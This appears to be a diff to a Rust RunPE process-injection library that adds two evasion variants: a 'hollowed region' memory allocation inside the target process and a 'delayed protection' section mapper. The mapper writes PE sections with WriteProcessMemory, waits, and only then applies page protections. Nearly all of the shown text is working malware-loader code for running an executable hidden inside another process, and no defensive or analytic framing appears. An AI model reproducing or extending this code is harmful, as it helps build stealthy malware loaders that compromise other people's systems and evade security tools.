@@ -53,17 +53,27 @@ pub enum RunPeError {
 #[derive(Debug, Clone, Copy, PartialEq)]
 pub enum MemoryAllocationStrategy {
     Standard,
+    
     NonContiguous,
+    
     RandomPadding,
+    
     ReverseOrder,
+    
+    HollowedRegion,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq)]
 pub enum SectionMappingStrategy {
     Standard,
+    
     RandomOrder,
+    
     Fragmented,
+    
     CustomProtection,
+    
+    DelayedProtection,
 }
 
 #[derive(Debug, Clone)]
@@ -190,6 +200,9 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
         MemoryAllocationStrategy::ReverseOrder => {
             allocate_memory_reverse_order(process_info.hProcess, image_size)?
         },
+        MemoryAllocationStrategy::HollowedRegion => {
+            allocate_hollowed_region_memory(process_info.hProcess, image_size)?
+        },
     };
 
     let success = unsafe {
@@ -229,6 +242,9 @@ pub fn inject_pe(pe_data: &[u8], config: &RunPeConfig) -> Result<u32, RunPeError
         },
         SectionMappingStrategy::CustomProtection => {
             map_sections_custom_protection(process_info.hProcess, remote_base, pe_data, sections)?
+        },
+        SectionMappingStrategy::DelayedProtection => {
+            map_sections_delayed_protection(process_info.hProcess, remote_base, pe_data, sections)?
         },
     }
 
@@ -726,6 +742,144 @@ fn map_sections_custom_protection(
             unsafe { TerminateProcess(process_handle, 1); }
             return Err(RunPeError::MemoryOperationFailed(format!(
                 "VirtualProtectEx final failed: {}",
+                unsafe { windows_sys::Win32::Foundation::GetLastError() }
+            )));
+        }
+    }
+    
+    Ok(())
+}
+
+#[cfg(target_os = "windows")]
+fn allocate_hollowed_region_memory(
+    process_handle: isize,
+    image_size: usize,
+) -> Result<*mut std::ffi::c_void, RunPeError> {
+    let extra_size = 4096 * 4; // 4 pages extra
+    
+    let remote_base = unsafe {
+        VirtualAllocEx(
+            process_handle,
+            std::ptr::null_mut(),
+            image_size + extra_size,
+            MEM_RESERVE | MEM_COMMIT,
+            PAGE_READWRITE,
+        )
+    };
+    
+    if remote_base.is_null() {
+        unsafe { TerminateProcess(process_handle, 1); }
+        return Err(RunPeError::MemoryOperationFailed(format!(
+            "VirtualAllocEx failed during initial allocation: {}",
+            unsafe { windows_sys::Win32::Foundation::GetLastError() }
+        )));
+    }
+    
+    let middle_addr = (remote_base as usize + image_size / 2) as *mut std::ffi::c_void;
+    let middle_size = std::cmp::min(4096 * 2, image_size / 4);
+    
+    let success = unsafe {
+        windows_sys::Win32::System::Memory::VirtualFreeEx(
+            process_handle,
+            middle_addr,
+            middle_size,
+            windows_sys::Win32::System::Memory::MEM_DECOMMIT,
+        )
+    };
+    
+    if success == 0 {
+        log::warn!("Failed to decommit memory region, continuing with standard allocation");
+    }
+    
+    let result = unsafe {
+        VirtualAllocEx(
+            process_handle,
+            middle_addr,
+            middle_size,
+            MEM_COMMIT,
+            PAGE_READWRITE,
+        )
+    };
+    
+    if result.is_null() {
+        log::warn!("Failed to reallocate memory region, continuing with standard allocation");
+    }
+    
+    Ok(remote_base)
+}
+
+#[cfg(target_os = "windows")]
+fn map_sections_delayed_protection(
+    process_handle: isize,
+    remote_base: *mut std::ffi::c_void,
+    pe_data: &[u8],
+    sections: &[IMAGE_SECTION_HEADER],
+) -> Result<(), RunPeError> {
+    for sect in sections {
+        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
+        let virt_size = sect.Misc.VirtualSize as usize;
+        let raw_size = sect.SizeOfRawData as usize;
+        let raw_ptr = pe_data.as_ptr().wrapping_add(sect.PointerToRawData as usize);
+        
+        if virt_size == 0 || raw_size == 0 {
+            continue;
+        }
+        
+        let success = unsafe {
+            WriteProcessMemory(
+                process_handle,
+                virt_addr,
+                raw_ptr as *const std::ffi::c_void,
+                std::cmp::min(virt_size, raw_size),
+                std::ptr::null_mut(),
+            )
+        };
+        
+        if success == 0 {
+            unsafe { TerminateProcess(process_handle, 1); }
+            return Err(RunPeError::MemoryOperationFailed(format!(
+                "WriteProcessMemory failed for section: {}",
+                unsafe { windows_sys::Win32::Foundation::GetLastError() }
+            )));
+        }
+    }
+    
+    std::thread::sleep(std::time::Duration::from_millis(50));
+    
+    for sect in sections {
+        let virt_addr = (remote_base as usize + sect.VirtualAddress as usize) as *mut std::ffi::c_void;
+        let virt_size = sect.Misc.VirtualSize as usize;
+        
+        if virt_size == 0 {
+            continue;
+        }
+        
+        let characteristics = sect.Characteristics;
+        let is_exec = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+        let is_write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+        
+        let new_protect = match (is_exec, is_write) {
+            (true, true) => PAGE_EXECUTE_READWRITE,
+            (true, false) => PAGE_EXECUTE_READ,
+            (false, true) => PAGE_READWRITE,
+            _ => PAGE_READONLY,
+        };
+        
+        let mut old_protect = 0;
+        let success = unsafe {
+            VirtualProtectEx(
+                process_handle,
+                virt_addr,
+                virt_size,
+                new_protect,
+                &mut old_protect,
+            )
+        };
+        
+        if success == 0 {
+            unsafe { TerminateProcess(process_handle, 1); }
+            return Err(RunPeError::MemoryOperationFailed(format!(
+                "VirtualProtectEx failed: {}",
                 unsafe { windows_sys::Win32::Foundation::GetLastError() }
             )));
         }
